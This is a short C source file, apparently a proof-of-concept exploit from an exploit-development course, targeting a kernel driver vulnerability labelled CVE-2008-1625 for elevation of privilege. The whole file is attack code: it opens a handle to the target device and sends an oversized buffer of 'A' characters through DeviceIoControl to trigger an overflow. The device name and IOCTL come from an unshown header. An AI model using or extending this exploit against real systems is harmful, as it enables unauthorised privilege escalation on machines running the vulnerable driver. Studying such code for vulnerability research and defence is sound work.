#include "poc.h"

int main(int argc, char** argv)
{
	printf("[!] EXP-401 CVE-2008-1625 Elevation of Privilege Exploit\n[!] Press enter to begin...");
	unused = getchar();

	if (getHandle())
	{
		printf("\n[-] Failed to obtain a handle. Handle Value: 0x%p, Error: 0x%x (%d)", hDriver, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle. Handle Value: 0x%p", hDriver);

	sendPayload();

	return 0;
}

int getHandle() 
{
	hDriver = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (hDriver == (HANDLE)-1)
	{
		return 1;
	}

	return 0;
}

int sendPayload()
{
	char input[1049];
	char output[1024];
	unsigned long bytesReturned = 0L;

	memset(&input, 'A', sizeof(input));

	DeviceIoControl(hDriver, TARGET_IOCTL, &input, sizeof(input), &output, sizeof(output), &bytesReturned, 0);
}